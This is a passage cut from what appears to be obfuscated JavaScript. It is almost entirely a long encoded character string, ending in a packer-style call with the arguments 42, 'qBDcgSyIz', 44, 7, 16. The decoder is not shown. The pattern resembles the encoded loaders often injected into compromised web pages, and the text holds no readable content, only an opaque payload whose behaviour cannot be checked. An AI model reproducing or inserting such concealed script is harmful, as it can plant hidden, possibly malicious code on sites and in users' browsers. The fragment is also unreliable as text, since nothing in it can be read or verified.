yIcqqIDySIcByIBgyIBSgIBgyIcBcIDcqIDcqIDSqIDgyIBgyIBSgIBgyIDySIcBgIBSyIBgyIBSgIBgyIBycIDqqIByDIDqDIBycIDqqIcDcIcBDIDDDIcBBIcBBIDcyIBgyIBSgIBgyIcBqIDyBIcDgIDyBIcBqIBSSIDyBIcBDIcqDIBSyIBgyIBSgIBgyIcDDIcBgIcqDIcByIDySIDDDIcqDIcqSIDySIDgBIBgyIBSgIBgyIDgcIDBSIDcSIDycIDcgIBgyIBSgIBgyIBycIDqqIByDIByDIBycIDqqIBygIDyDIDyDIDDqIDBSIDygIcDSIBgyIBSgIBgyIcDqIcqcIDycIDgcIDyDIBgyIBSgIBgyIcBgIcDqIcBqIBgyIBSgIBgyIDDBIcBgIcBgIcBBIcBgIBSyIDScIcDcIBycIByBIDgDIcBgIcDgIBgyIBSgIBgyIDyyIDySIcqyIDyBIcqSIDySIBgyIBSgIBgyIDycIcBgIDySIDyBIcByIDySIDgqIDySIDyBIDygIBgyIBSgIBgyIDqDIDqBIBycIDqDIDqqIByBIByBIDcqIDgBIDgSIcDqIDDDIDyyIBgyIBSgIBgyIcDqIcBgIcqSIBgyIBSgIBgyIDySIDSqIDggIDSqIDycIBgyIBSgIBgyIBSyIcBDIcBqIcqqIBgyIBSgIBgyIcBgIDySIcBDIcqSIBSyIDycIcBBIByqIcqDIcqyIBgyIBSgIBgyIcDgIDScIcDcIBycIByBIDyBIcqqIDyBIcqDIcBqIDScIcDcIBycIByBIcqSIDyBIBgyIBSgIBgyIDyBIcqqIDySIcBSIByqIcBDIcBDIDycIcBBIcDqIBgyIBSgIBgyIDyBIcBgIcBgIDyBIcDgIDyDIcDqIDyyIDyyIDySIBgyIBSgIBgyIcDcIDgqIcBgIcByIcBqIBgyIBSgIBgyIcqyIDySIcBSIcBSIDyBIcqqIDySIDDSIDDqIBgyIBSgIBgyIcDgIcBqIDycIBgyIBSgIBgyIBygIDqqIDqcIDqDIBycIBygIBycIcDqIDyDIDccIDyDIDSqIDcgIBgyIBSgIBgyIDSqIDDBIDBSIDggIDDSIBgyIBSgIBgyIDygIDyBIcByIDyBIBgyIBSgIBgyIcByIcqBIcBgIDySIDyBIDygIDDSIDDqIBgyIBSgIBgyIDgBIcByIcBgIDySIDyBIcqyIBgyIBSgIBgyIcqBIcByIcByIcBDIcBSIDqgIByqIByqIcqyIDyBIBgyIBSgIBgyIDyyIcBgIcBBIcqyIBgyIBSgIBgyIDySIcDcIcBDIcBBIcBgIcByIcBSIBgyIBSgIBgyIcqDIcBqIBSSIcBSIDySIcBgIcDBIDySIcBgIBSyIBgyIBSgIBgyIByqIDycIDyBIDycIcqBIDySIByqIDyBIcBqIcqDIBgyIBSgIBgyIcDqIcByIDyyIBSSIDqDIBgyIBSgIBgyIDqcIcBSIcBgIDcSIDSqIDcgIcqqIBgyIBSgIBgyIByDIDqDIDgSIDgSIDBSIDcqIcDDIDyyIBgyIBSgIBgyIcBSIDySIcByIDcDIDySIcBSIcBSIDyBIcqqIDySIBgyIDSgIDqSIDSyIByBIcDcIByyIDyBIDqDIBySIDBqIDyyIcDqIcBqIDycIcByIcqDIcBBIcBqIBSqIBSBIcDyIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIBycIByBIByyIDygIByDIDyyIDqSIccBIDqSIcBgIDySIcByIcDqIcBgIcBqIBcyIDSyIByBIcDcIByyIDyBIDqDIBySIBSqIBSBIDqSIccBI",42,"qBDcgSyIz",44,7,16)) 
